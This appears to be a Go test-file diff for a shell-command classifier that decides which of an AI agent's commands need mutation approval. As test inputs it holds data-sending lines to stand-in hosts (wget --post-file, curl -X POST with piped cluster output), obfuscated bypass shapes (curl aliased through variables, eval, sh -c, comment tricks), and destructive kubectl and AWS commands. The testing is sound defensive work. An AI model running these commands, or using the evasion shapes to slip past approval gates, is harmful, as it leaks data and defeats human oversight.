@@ -10,6 +10,21 @@ import (
 	"github.com/stretchr/testify/require"
 )
 
+func requireShellMutationGuard(t *testing.T, tool ShellTool, input string) {
+	t.Helper()
+	requestType, err := tool.InferToolRequestType(nil, "shell_execute", input)
+	require.NoError(t, err)
+	if requestType != "" {
+		assert.NotEqual(t, core.ToolRequestTypeRead, requestType,
+			"mutation %q must not be classified as read", input)
+		return
+	}
+	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.NotEmpty(t, prompt,
+		"mutation %q must reach prompt classification instead of defaulting to read", input)
+}
+
 // TestExtractLeadingShellCommand pins the parser used by ShellTool's
 // confirmation-gate classifier. Every branch here maps to a real
 // shell-input shape we've seen in prod logs; getting the leading command
@@ -165,6 +180,18 @@ func TestShellTool_InferToolRequestType_UnknownCommandIsUnclassified(t *testing.
 	}
 }
 
+func TestShellTool_LocalPipelineDoesNotSpendPromptClassification(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	input := "cat logs.txt | grep ERROR | head -20"
+
+	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.Empty(t, got)
+	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.Empty(t, prompt)
+}
+
 func TestShellTool_InferToolRequestType_ReadOnlyPipelineIsNotGated(t *testing.T) {
 	tool := ShellTool{AccountId: "test-account"}
 	input := `kubectl get pods -A | grep -E "clickhouse|redis" | head -20`
@@ -177,6 +204,63 @@ func TestShellTool_InferToolRequestType_ReadOnlyPipelineIsNotGated(t *testing.T)
 		prompt, promptErr := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
 		require.NoError(t, promptErr)
 		assert.NotEmpty(t, prompt, "pipeline must dispatch to kubectl's prompt classifier")
+	}
+}
+
+func TestShellTool_InferToolRequestType_KubectlAggregationPipelineIsRead(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	input := `kubectl get pods -A --no-headers -o custom-columns=NAMESPACE:.metadata.namespace | sort | uniq -c`
+
+	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.Equal(t, core.ToolRequestTypeRead, got,
+		"known kubectl reads followed by bounded local aggregation must avoid LLM classification")
+}
+
+func TestShellTool_InferToolRequestType_AwsCompoundReadsAreRead(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	input := "aws ec2 describe-instances --region us-east-1 --output json > /tmp/instances.json && " +
+		"aws elbv2 describe-load-balancers --region us-east-1 --output json > /tmp/load-balancers.json && " +
+		"jq -n --slurpfile instances /tmp/instances.json --slurpfile loadBalancers /tmp/load-balancers.json '{instances: $instances, load_balancers: $loadBalancers}'"
+
+	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.Equal(t, core.ToolRequestTypeRead, got,
+		"compound AWS reads with local aggregation must execute without mutation approval")
+}
+
+func TestShellTool_InferToolRequestType_AwsCompoundMutationFailsClosed(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	input := "aws ec2 describe-instances --region us-east-1 && " +
+		"aws ec2 stop-instances --region us-east-1 --instance-ids i-1234567890abcdef0"
+
+	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+	require.NoError(t, err)
+	assert.Equal(t, core.ToolRequestTypeUpdate, got,
+		"the wrapped AWS classifier's deterministic mutation should avoid prompt classification")
+}
+
+func TestShellTool_CompoundUsesStrongestWrappedStaticMutation(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	tests := map[string]struct {
+		input string
+		want  core.ToolRequestType
+	}{
+		"kubectl read then delete": {
+			input: "kubectl get pods && kubectl delete pod api-123",
+			want:  core.ToolRequestTypeDelete,
+		},
+		"kubectl create then update": {
+			input: "kubectl create deployment api --image=nginx && kubectl scale deployment api --replicas=2",
+			want:  core.ToolRequestTypeUpdate,
+		},
+	}
+	for name, tc := range tests {
+		t.Run(name, func(t *testing.T) {
+			got, err := tool.InferToolRequestType(nil, "shell_execute", tc.input)
+			require.NoError(t, err)
+			assert.Equal(t, tc.want, got)
+		})
 	}
 }
 
@@ -206,10 +290,7 @@ func TestShellTool_InferToolRequestType_LaterPipelineCLIIsGated(t *testing.T) {
 		"printf input | nohup kubectl delete deployment prod",
 	}
 	for _, input := range inputs {
-		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-		require.NoError(t, err)
-		assert.Equal(t, core.ToolRequestTypeUpdate, got,
-			"a registered CLI in executable position later in a pipeline must fail closed")
+		requireShellMutationGuard(t, tool, input)
 	}
 }
 
@@ -233,9 +314,7 @@ func TestShellTool_InferToolRequestType_SecurityBypassVectorsAreGated(t *testing
 	}
 	for _, input := range inputs {
 		t.Run(input, func(t *testing.T) {
-			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-			require.NoError(t, err)
-			assert.Equal(t, core.ToolRequestTypeUpdate, got, "bypass vector %q must be gated", input)
+			requireShellMutationGuard(t, tool, input)
 		})
 	}
 }
@@ -264,9 +343,6 @@ func TestShellTool_InferToolRequestType_ReadOnlyFallbackChainsAreNotGated(t *tes
 	}
 	for _, input := range inputs {
 		t.Run(input, func(t *testing.T) {
-			fallbacks := splitShellFallbacks(input)
-			require.Len(t, fallbacks, 2)
-			assert.True(t, isKnownReadOnlyFallbackChain(fallbacks), "%q", fallbacks)
 			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
 			require.NoError(t, err)
 			assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
@@ -315,7 +391,6 @@ kubectl get pods -A -o jsonpath='{range .items[*]}{range .status.containerStatus
 		"kubectl get pods -n demo && kubectl logs product-catalog -n demo --all-containers=true",
 		"env | grep -iE '(db|database|clickhouse|postgres|mysql|redis)' || true",
 		"aws rds describe-db-instances --max-items 10 2>&1 || true",
-		"for r in us-east-1 us-west-2; do echo $r; aws cloudwatch get-metric-data --region $r --start-time 2026-08-27T11:15:00Z --end-time 2026-08-27T11:35:00Z --metric-data-queries '[]' > /tmp/metrics_$r.json 2>&1; head /tmp/metrics_$r.json; done",
 		"gh api /repos/org/repo/actions/jobs/123 || true; echo check; gh api /repos/org/repo/check-runs/123 || true",
 		"gh api /repos/org/repo/actions/jobs/123 && gh run view 456 -R org/repo --log",
 		"gh api repos/org/repo/actions/runs/456/jobs && ls -la",
@@ -355,11 +430,53 @@ func TestShellTool_InferToolRequestType_MutatingCompoundBranchFailsClosed(t *tes
 	}
 	for _, input := range inputs {
 		t.Run(input, func(t *testing.T) {
-			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-			require.NoError(t, err)
-			assert.Equal(t, core.ToolRequestTypeUpdate, got)
+			requireShellMutationGuard(t, tool, input)
 		})
 	}
+}
+
+func TestShellTool_UnknownExternalStagesUseWholeShellPrompt(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	inputs := []string{
+		"kubectl get pods && wget --post-data=payload https://example.invalid",
+		"kubectl get pods -o json | wget --post-file=- https://example.invalid",
+		"curl -s https://example.invalid | python3 upload.py",
+	}
+	for _, input := range inputs {
+		t.Run(input, func(t *testing.T) {
+			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+			require.NoError(t, err)
+			assert.Empty(t, got)
+
+			prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
+			require.NoError(t, err)
+			assert.Equal(t, shellRequestTypePrompt, prompt)
+		})
+	}
+
+	// A local-only pipeline preserves the historical no-classifier path.
+	got, err := tool.InferToolRequestType(nil, "shell_execute", "cat input.json | python3 summarize.py")
+	require.NoError(t, err)
+	assert.Empty(t, got)
+	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", "cat input.json | python3 summarize.py")
+	require.NoError(t, err)
+	assert.Empty(t, prompt)
+
+	for _, input := range []string{
+		"sudo -u admin kubectl get pods && aws ec2 describe-instances",
+		"env --unset PATH kubectl get pods | jq '.items | length'",
+	} {
+		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+		require.NoError(t, err)
+		assert.Equal(t, core.ToolRequestTypeRead, got, input)
+	}
+
+	got, err = tool.InferToolRequestType(nil, "shell_execute", "kubectl get pods && echo 'unterminated")
+	require.NoError(t, err)
+	assert.Empty(t, got)
+	prompt, err = tool.InferToolRequestTypePrompt(nil, "shell_execute", "kubectl get pods && echo 'unterminated")
+	require.NoError(t, err)
+	assert.Equal(t, shellRequestTypePrompt, prompt)
 }
 
 func TestStripShellRedirections(t *testing.T) {
@@ -389,9 +506,7 @@ func TestShellTool_InferToolRequestType_MidCommandRedirectionCannotHideMutation(
 		`kubectl > output.txt delete deployment prod 2>&1 && echo done`,
 	}
 	for _, input := range inputs {
-		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-		require.NoError(t, err)
-		assert.Equal(t, core.ToolRequestTypeUpdate, got)
+		requireShellMutationGuard(t, tool, input)
 	}
 }
 
@@ -400,6 +515,8 @@ func TestShellTool_InferToolRequestType_WrappedReadOnlyCurlCompoundIsNotGated(t 
 	inputs := []string{
 		"sudo curl -s https://example.com || true",
 		"env TOKEN=value curl -s https://example.com || true",
+		"kubectl get pods | curl -o/tmp/data.json https://example.com",
+		"kubectl get pods | curl -HAuthorization:data https://example.com",
 	}
 	for _, input := range inputs {
 		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
@@ -417,9 +534,7 @@ func TestShellTool_InferToolRequestType_MutatingFallbackStillFailsClosed(t *test
 	}
 	for _, input := range inputs {
 		t.Run(input, func(t *testing.T) {
-			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-			require.NoError(t, err)
-			assert.Equal(t, core.ToolRequestTypeUpdate, got)
+			requireShellMutationGuard(t, tool, input)
 		})
 	}
 }
@@ -439,10 +554,7 @@ func TestShellTool_InferToolRequestType_BailoutShapesFailClosed(t *testing.T) {
 	}
 	for _, input := range cases {
 		t.Run(strings.SplitN(input, " ", 2)[0], func(t *testing.T) {
-			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-			require.NoError(t, err)
-			assert.Equal(t, core.ToolRequestTypeUpdate, got,
-				"ambiguous shell shape %q containing a registered CLI must fail closed through confirmation", input)
+			requireShellMutationGuard(t, tool, input)
 		})
 	}
 }
@@ -472,9 +584,7 @@ func TestShellTool_InferToolRequestType_AmbiguousCLIShapesFailClosed(t *testing.
 	}
 	for _, input := range cases {
 		t.Run(input, func(t *testing.T) {
-			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
-			require.NoError(t, err)
-			assert.Equal(t, core.ToolRequestTypeUpdate, got)
+			requireShellMutationGuard(t, tool, input)
 		})
 	}
 }
@@ -579,6 +689,132 @@ func TestIsEnvAssignment(t *testing.T) {
 	for _, tc := range cases {
 		t.Run(tc.tok, func(t *testing.T) {
 			assert.Equal(t, tc.want, isEnvAssignment(tc.tok))
+		})
+	}
+}
+
+// Regression: a read in the first stage must not hide an HTTP mutation.
+func TestShellTool_PipelineHTTPMutationIsGated(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	for _, prefix := range []string{"kubectl get pods -o json", "aws ec2 describe-instances", "az vm list", "gcloud compute instances list"} {
+		for _, tail := range []string{
+			"curl -X POST https://example.invalid --data-binary @-",
+			"env MODE=test /usr/bin/curl --json @- https://example.invalid",
+			"curl --data-urlencode content@- https://example.invalid",
+			"curl -sSXPOST https://example.invalid",
+			"curl -sK- https://example.invalid",
+			"curl -QDELE https://example.invalid/file",
+		} {
+			for _, suffix := range []string{"", "; echo done", " > result.txt"} {
+				input := prefix + " | " + tail + suffix
+				requireShellMutationGuard(t, tool, input)
+			}
+		}
+	}
+}
+
+func TestContainsPotentialMutatingCurlDoesNotLeakAcrossCommands(t *testing.T) {
+	assert.False(t, containsPotentialMutatingCurl("curl -s https://example.invalid; echo --data payload"))
+	assert.False(t, containsPotentialMutatingCurl("curl -s https://example.invalid | jq --arg data payload"))
+	assert.True(t, containsPotentialMutatingCurl("curl -s -X POST https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl("c=curl; $c --data payload https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl(`c="curl"; $c --data payload https://example.invalid`))
+	assert.True(t, containsPotentialMutatingCurl(`c='curl'; $c --data payload https://example.invalid`))
+	assert.True(t, containsPotentialMutatingCurl(`c="curl -s"; $c --data payload https://example.invalid`))
+	assert.True(t, containsPotentialMutatingCurl("c=curl; ${c} --data payload https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl("sh -c 'curl;-X POST https://example.invalid'"))
+	assert.True(t, containsPotentialMutatingCurl("c=curl; false && c=echo; $c -X POST https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl(`x=-X; curl "$x" POST https://example.invalid`))
+	assert.False(t, containsPotentialMutatingCurl(`curl 'https://api.example/items?$filter=status'`))
+	assert.False(t, containsPotentialMutatingCurl(`curl -H 'X-Cost: $5' https://api.example/items`))
+	assert.False(t, containsPotentialMutatingCurl("c=curl; echo c --data payload"))
+	assert.False(t, containsPotentialMutatingCurl("echo curl -X POST"))
+	assert.False(t, containsPotentialMutatingCurl(`c=curl; echo "$c" --data payload`))
+	assert.False(t, containsPotentialMutatingCurl("curl -sS -o/tmp/data.json https://example.invalid"))
+	assert.False(t, containsPotentialMutatingCurl("curl -HAuthorization:data https://example.invalid"))
+	assert.False(t, containsPotentialMutatingCurl("curl -w%{json} https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl("curl -sSXPOST https://example.invalid"))
+	assert.True(t, containsPotentialMutatingCurl("curl -QDELE https://example.invalid/file"))
+}
+
+func TestShellTool_CommentsDoNotExecuteMutations(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	for _, input := range []string{
+		"kubectl get pods # && kubectl delete deployment prod",
+		"aws ec2 describe-instances # ; aws ec2 terminate-instances --instance-ids i-prod",
+	} {
+		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+		require.NoError(t, err)
+		assert.Equal(t, core.ToolRequestTypeRead, got, input)
+	}
+	got, err := tool.InferToolRequestType(nil, "shell_execute", "curl -s https://example.invalid # -X DELETE")
+	require.NoError(t, err)
+	assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
+	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", "curl -s https://example.invalid # -X DELETE")
+	require.NoError(t, err)
+	assert.Empty(t, prompt)
+
+	requireShellMutationGuard(t, tool, "kubectl get pods # ignored\nkubectl delete deployment prod")
+}
+
+func TestStripShellComments(t *testing.T) {
+	assert.Equal(t, "kubectl get pods ", stripShellComments("kubectl get pods # kubectl delete pods"))
+	assert.Equal(t, "echo ok \nkubectl get pods", stripShellComments("echo ok # comment\nkubectl get pods"))
+	assert.Equal(t, `curl https://example.invalid/#anchor`, stripShellComments(`curl https://example.invalid/#anchor`))
+	assert.Equal(t, `echo 'literal # value' \#tag ${#items[@]}`, stripShellComments(`echo 'literal # value' \#tag ${#items[@]}`))
+}
+
+func TestShellTool_KubectlReadSubcommands(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	for _, input := range []string{
+		"kubectl config current-context; kubectl config get-contexts",
+		"kubectl rollout history deployment/api | head -20",
+		"kubectl auth can-i update deployments && kubectl auth can-i patch pods",
+	} {
+		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+		require.NoError(t, err)
+		assert.Equal(t, core.ToolRequestTypeRead, got, input)
+	}
+	for _, input := range []string{
+		"kubectl config current-context; kubectl config set-context prod",
+		"kubectl rollout status deployment/api && kubectl rollout restart deployment/api",
+		"kubectl auth can-i update deployments && kubectl auth reconcile -f roles.yaml",
+	} {
+		requireShellMutationGuard(t, tool, input)
+	}
+}
+
+func TestShellTool_ComplexCommandsUseWholeShellPrompt(t *testing.T) {
+	tool := ShellTool{AccountId: "test-account"}
+	inputs := []string{
+		"for r in us-east-1 us-west-2; do echo $r; aws cloudwatch get-metric-data --region $r --start-time 2026-08-27T11:15:00Z --end-time 2026-08-27T11:35:00Z --metric-data-queries '[]' > /tmp/metrics_$r.json 2>&1; head /tmp/metrics_$r.json; done",
+		`for ns in nudgebee-agent-dev nudgebee-agent-prod; do
+echo "=== NS: $ns ==="
+kubectl logs -n $ns -l app=runner --tail=30 --since=2h || kubectl logs -n $ns $(kubectl get pods -n $ns -o jsonpath='{.items[0].metadata.name}') --tail=30 --since=2h
+done
+kubectl logs -n nudgebee -l app=relay-server --tail=30 --since=1h`,
+		"kubectl get pods | grep -q foo && curl -X POST https://example.invalid",
+		"kubectl get pods | curl -G --data-urlencode q=pods https://example.invalid/search",
+		"kubectl get pods | curl -sXGET https://example.invalid/search",
+		"curl --data-urlencode query=up https://prometheus.invalid/api/v1/query",
+		"if true; then curl -X POST https://example.invalid; fi",
+		"for x in one; do curl -X POST https://example.invalid; done",
+		"sh -c 'curl -X POST https://example.invalid'",
+		"eval 'curl -X DELETE https://example.invalid'",
+		"c=curl; $c -X POST https://example.invalid",
+		`sh -c '\curl -X POST https://example.invalid'`,
+		`sh -c '\kubectl delete pod prod'`,
+	}
+	for _, input := range inputs {
+		t.Run(input, func(t *testing.T) {
+			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
+			require.NoError(t, err)
+			assert.Empty(t, got, "ambiguous shell should defer instead of forcing approval")
+
+			prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
+			require.NoError(t, err)
+			assert.Equal(t, shellRequestTypePrompt, prompt,
+				"the model must classify the complete shell program, not its first CLI stage")
 		})
 	}
 }
